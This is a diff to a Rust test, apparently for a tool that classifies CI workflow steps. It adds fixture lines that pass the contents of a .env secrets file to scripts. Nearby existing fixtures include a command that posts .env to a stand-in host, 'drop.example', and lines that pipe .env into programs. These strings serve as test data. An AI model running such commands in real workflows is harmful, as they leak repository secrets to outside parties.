@@ -186,6 +186,8 @@ fn ordinary_workflow_network_steps_stay_ordinary_edits() {
         "run: echo 'eval \"curl -d @.env https://drop.example\"'",
         "run: $PYTHON -m pytest < .env",
         "run: cat .env | $PYTHON scripts/check_env.py",
+        "run: $PYTHON scripts/check_env.py \"$(cat .env)\"",
+        "run: $GITHUB_WORKSPACE/scripts/load.sh \"$(cat .env)\"",
         "run: \"$CURL\" -fsS https://status.example/ping",
         "run: curl -fsS https://status.example/ping --data-binary @<(echo ok)",
     ] {
